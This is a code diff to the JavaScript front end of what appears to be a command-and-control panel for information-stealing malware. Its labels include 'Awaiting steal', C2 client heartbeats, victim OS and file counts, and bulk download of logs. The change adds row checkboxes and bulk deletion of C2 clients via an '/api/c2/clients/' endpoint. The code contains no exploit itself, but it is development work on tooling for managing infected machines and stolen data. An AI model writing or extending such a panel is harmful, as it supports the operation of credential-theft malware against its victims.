@@ -793,7 +793,9 @@ function renderC2OnlyRow(client, isOnline) {
     const hbDate = client.last_heartbeat ? formatDate(client.last_heartbeat) : '';
 
     row.innerHTML = `
-        <div class="client-checkbox"></div>
+        <div class="client-checkbox">
+            <input type="checkbox" data-client-id="${escapeHtml(client.client_id)}" onchange="updateBulkActions()">
+        </div>
         <div class="client-status-pill ${statusClass}">
             <span class="status-dot"></span>
             <span class="status-text">${statusText}</span>
@@ -806,11 +808,14 @@ function renderC2OnlyRow(client, isOnline) {
         <div class="client-info-os"><span>Awaiting steal</span></div>
         <div class="client-info-files"><span>—</span></div>
         <div class="client-info-date">${hbDate}</div>
-        ${!isOnline ? `<button class="btn-delete-client" title="Remove client" onclick="event.stopPropagation(); deleteClient('${escapeHtml(client.client_id)}', this)">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
-        </button>` : ''}
     `;
-    row.addEventListener('dblclick', () => {
+    const checkbox = row.querySelector('input[type="checkbox"]');
+    checkbox.addEventListener('change', (e) => {
+        e.stopPropagation();
+        row.classList.toggle('selected', checkbox.checked);
+    });
+    row.addEventListener('dblclick', (e) => {
+        if (e.target.type === 'checkbox') return;
         window.open('/client.html?id=' + encodeURIComponent(client.client_id), '_blank');
     });
     return row;
@@ -829,7 +834,7 @@ function renderClientRow(log, isOnline) {
 
     row.innerHTML = `
         <div class="client-checkbox">
-            <input type="checkbox" data-log-id="${log.id}" onchange="updateBulkActions()">
+            <input type="checkbox" data-log-id="${log.id}" data-client-id="${escapeHtml(clientId)}" onchange="updateBulkActions()">
         </div>
         <div class="client-status-pill ${statusClass}">
             <span class="status-dot"></span>
@@ -843,9 +848,6 @@ function renderClientRow(log, isOnline) {
         <div class="client-info-os"><span>${escapeHtml(log.os)}</span></div>
         <div class="client-info-files"><span>${log.file_count} files</span></div>
         <div class="client-info-date">${dateStr}</div>
-        ${!isOnline ? `<button class="btn-delete-client" title="Remove client" onclick="event.stopPropagation(); deleteClient('${escapeHtml(clientId)}', this)">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
-        </button>` : ''}
     `;
 
     const checkbox = row.querySelector('input[type="checkbox"]');
@@ -878,17 +880,24 @@ async function deleteClient(clientId, btnEl) {
 
 function getSelectedLogIds() {
     return Array.from(document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked'))
+        .filter(cb => cb.dataset.logId)
         .map(cb => parseInt(cb.dataset.logId));
 }
 
+function getSelectedClientIds() {
+    return Array.from(document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked'))
+        .filter(cb => cb.dataset.clientId)
+        .map(cb => cb.dataset.clientId);
+}
+
 function updateBulkActions() {
-    const selected = getSelectedLogIds();
+    const totalSelected = document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked').length;
     const bar = document.getElementById('bulk-actions');
     const countEl = document.getElementById('bulk-count-num');
 
-    if (selected.length > 0) {
+    if (totalSelected > 0) {
         bar.classList.add('visible');
-        countEl.innerText = selected.length;
+        countEl.innerText = totalSelected;
     } else {
         bar.classList.remove('visible');
     }
@@ -1321,19 +1330,27 @@ document.getElementById('bulk-download-btn').addEventListener('click', () => {
 });
 
 document.getElementById('bulk-delete-btn').addEventListener('click', () => {
-    const ids = getSelectedLogIds();
-    if (ids.length === 0) return;
+    const logIds = getSelectedLogIds();
+    const clientIds = getSelectedClientIds();
+    const total = document.querySelectorAll('.client-checkbox input[type="checkbox"]:checked').length;
+    if (total === 0) return;
     showDialog({
         title: 'Bulk Delete',
-        message: `Delete ${ids.length} selected log(s)? This cannot be undone.`,
+        message: `Delete ${total} selected item(s)? This cannot be undone.`,
         type: 'danger',
-        confirmText: `Delete ${ids.length}`,
+        confirmText: `Delete ${total}`,
         onConfirm: async () => {
-            for (const id of ids) {
+            for (const id of logIds) {
                 await deleteLog(id);
             }
+            const uniqueClients = [...new Set(clientIds)];
+            for (const cid of uniqueClients) {
+                try {
+                    await fetch('/api/c2/clients/' + encodeURIComponent(cid), { method: 'DELETE' });
+                } catch {}
+            }
             loadClients();
-            showToast('Bulk delete complete', `${ids.length} log(s) removed`);
+            showToast('Bulk delete complete', `${total} item(s) removed`);
         }
     });
 });
